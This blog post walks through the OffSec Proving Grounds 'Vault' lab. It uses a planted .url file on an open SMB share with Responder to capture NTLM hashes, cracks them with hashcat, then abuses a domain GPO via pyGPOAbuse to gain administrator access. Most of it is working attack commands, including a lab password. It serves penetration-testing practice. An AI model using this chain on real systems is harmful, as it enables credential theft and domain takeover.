---
title: Vault
date: 2026-03-27T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - GPO
  - Active-Directory
  - Impacket
  - Bloodhound
  - evilwinrm
  - enum4linux-ng
  - Hashcat
  - smb
  - smbclient
  - url-upload
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Vault"
---
"I ate his liver with some fava beans and a nice chianti"
-- Thomas Harris

`nmap -p- -sS -sV -sC  -A 192.168.175.172  -min-rate 5000`

![](Screenshot%202026-03-26%20at%2008.45.40.png)

NetBIOS computer name: DC  
NetBIOS domain name: VAULT  
DNS domain: vault.offsec  
FQDN: DC.vault.offsec  
Derived membership: domain member  
Derived domain: VAULT

`enum4linux-ng -A 192.168.175.172`

![](Screenshot%202026-03-26%20at%2008.47.58.png)

![](Screenshot%202026-03-26%20at%2008.48.33.png)

So far we know that we have a Domain controller with DNS, SMB, it will authenticate on rpc and ldap in some way. 

![](Screenshot%202026-03-26%20at%2008.53.53.png)

`dig -t SRV _ldap._tcp.vault.offsec @192.168.175.172`

![](Screenshot%202026-03-26%20at%2009.13.47.png)

Okay after a few different attempts to access ldap and rpc I got a nibble on smb. 

smbclient -L //192.168.175.172/  -U "vault\guest"

![](Screenshot%202026-03-26%20at%2010.35.59.png)

After a good look around I thought about using a put command and was able to upload a random file.

![](Screenshot%202026-03-26%20at%2010.37.15.png)

URL upload attack:

I followed this:  
https://github.com/LexKingz/Active-Directory-Attack-Lifecycle-Lab/blob/main/02-Initial-Access-TA0001/url-file-attack.md

When you put an icon file into a smb share folder windows will open the file as soon as a user navigates to the share folder. 

To do this create a url file with this inside:


[InternetShortcut]
URL=file://192.168.45.173/test  
IconFile=\\192.168.45.173\share\icon.ico   
IconIndex=1


Start a responder session:  
`responder -I tun0`

![](Screenshot%202026-03-26%20at%2010.39.01.png)


Carck the hash:  
`hashcat -m 5600  anirudh /usr/share/wordlists/rockyou.txt`

![](Screenshot%202026-03-26%20at%2010.57.30.png)

`hashcat -m 5600  anirudh /usr/share/wordlists/rockyou.txt --show`

![](Screenshot%202026-03-26%20at%2010.42.26.png)

![](Screenshot%202026-03-26%20at%2010.56.54.png)

Not really sure what to look for here. Bloodhound might illuminate things. 

bloodhound-python -u "anirudh" -p 'SecureHM' -d vault.offsec -c all   --zip -ns 192.168.242.172

![](Screenshot%202026-03-27%20at%2009.28.01.png)

Upload the zip file to bloodhound.

![](Screenshot%202026-03-27%20at%2009.28.48.png)

![](Screenshot%202026-03-27%20at%2009.29.35.png)

We also need this GPO ID for later:  
31B2F340-016D-11D2-945F-00C04FB984F9 

![](Screenshot%202026-03-27%20at%2009.30.53.png)

pyGPOAbuse:

To use this tool we need to clone the repository, create a venv activate the venv and install the requirements.

 At 2:19 there is a walkthrough setting up and using this tool:
 https://youtu.be/miOE_yYh1JY?si=mZEIEy6D6JzpNkaN

`git clone https://github.com/Hackndo/pyGPOAbuse.git`

`cd pyGPOAbuse`

`python -m venv .venv`

`source .venv/bin/activate`

`pip3 install -r requirements.txt`

`python pygpoabuse.py vault.offsec/anirudh:SecureHM -dc-ip 192.168.242.172 -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -command "net localgroup administrators anirudh /add"`

![](Screenshot%202026-03-27%20at%2008.37.50.png)

Wait about a minute for a user to check the share folder.

This command will show you is the user has admin privileges:  
`evil-winrm -i 192.168.242.172 -u "anirudh"  -p "SecureHM"`

`smbclient //192.168.242.172/C$ -U "VAULT\anirudh%SecureHM"`

![](Screenshot%202026-03-27%20at%2008.36.22.png)

![](Screenshot%202026-03-27%20at%2008.35.57.png)

I didn't realise but I could have used evil-winrm. I checked because I was going to add the 'anirudh' user the Remote Management Users group:

![](Screenshot%202026-03-27%20at%2011.44.05.png)

`evil-winrm -i 192.168.242.172 -u "anirudh"  -p "SecureHM"`

If I wasn't already a member I could have used this command on kali: 

`python pygpoabuse.py vault.offsec/anirudh:SecureHM -dc-ip 192.168.242.172 -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -command "net localgroup 'Remote Management Users'  anirudh /add"`



![](Screenshot%202026-03-27%20at%2011.50.44.png)

After waiting 1 minute.

![](Screenshot%202026-03-27%20at%2011.51.07.png)


Powershell command via evil-winrm:  
`Add-ADGroupMember -Identity "Remote Management Users" -Members "anirudh"`

![](Screenshot%202026-03-27%20at%2012.07.40.png)

Check the group members:  
`Get-ADGroupMember -Identity "Remote Management Users"`

3 hours, 45 minutes!
